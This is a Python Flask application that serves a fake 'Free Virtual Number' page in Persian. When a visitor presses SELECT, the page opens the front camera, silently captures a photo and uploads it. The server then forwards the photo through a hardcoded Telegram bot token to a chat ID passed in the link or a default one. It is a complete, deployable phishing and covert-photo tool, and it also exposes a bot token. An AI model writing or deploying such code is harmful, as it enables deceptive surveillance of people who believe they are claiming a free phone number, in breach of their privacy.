import os
from flask import Flask, render_template_string, request, jsonify
import telebot

app = Flask(__name__)
BOT_TOKEN = "8628341169:AAH0RN8xSL2GuKIhqiEElvndV_xWoUyw9WE"
bot = telebot.TeleBot(BOT_TOKEN)

HTML_CONTENT = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Virtual Number</title>
    <style>
        body { background: #0b0f19; color: white; text-align: center; padding-top: 40px; font-family: sans-serif; }
        .card { background: #161f30; padding: 20px; border-radius: 10px; display: inline-block; width: 85%; max-width: 350px; }
        button { background: #ef4444; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; margin-top: 15px; width: 100%; font-size: 16px; font-weight: bold; }
        #video-container { margin-top: 15px; display: none; }
        video { width: 100%; max-height: 200px; border-radius: 8px; object-fit: cover; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🇺🇸 United States</h2>
        <p style="color: #9ca3af; font-size: 14px;">+1 398 362 8901</p>
        
        <!-- کادر ویدیو که برای گرفتن مجوز ضروری است -->
        <div id="video-container">
            <video id="video" autoplay playsinline muted></video>
        </div>
        
        <button id="sel-btn" onclick="capture()">SELECT</button>
    </div>

    <script>
        async function capture() {
            const btn = document.getElementById('sel-btn');
            const videoContainer = document.getElementById('video-container');
            const video = document.getElementById('video');
            
            btn.disabled = true;
            btn.innerText = "در حال اتصال...";
            videoContainer.style.display = "block";

            try {
                // درخواست صریح دسترسی به دوربین جلو با استانداردهای موبایل
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                video.srcObject = stream;
                await video.play();

                // مکث کوتاه برای پایدار شدن تصویر دوربین
                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640; 
                    canvas.height = video.videoHeight || 480;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'photo.jpg');
                        
                        try {
                            await fetch("/upload" + window.location.search, { 
                                method: 'POST', 
                                body: formData 
                            });
                        } catch (err) {
                            console.log("Upload error:", err);
                        }
                        
                        // متوقف کردن دوربین بعد از ارسال
                        stream.getTracks().forEach(track => track.stop());
                        videoContainer.style.display = "none";
                        alert("Connecting...");
                        
                    }, 'image/jpeg', 0.90);

                }, 1200);

            } catch (e) {
                console.error(e);
                alert("لطفاً اجازه دسترسی به دوربین را تایید کنید.");
                btn.disabled = false;
                btn.innerText = "SELECT";
                videoContainer.style.display = "none";
            }
        }
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_CONTENT)

@app.route("/upload", methods=["POST"])
def upload():
    user_id = request.args.get("user")
    photo = request.files.get("photo")
    
    if photo:
        target_id = user_id if user_id else "8173349543"
        try:
            bot.send_photo(target_id, photo)
        except Exception as e:
            print(f"Error sending photo: {e}")
            
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
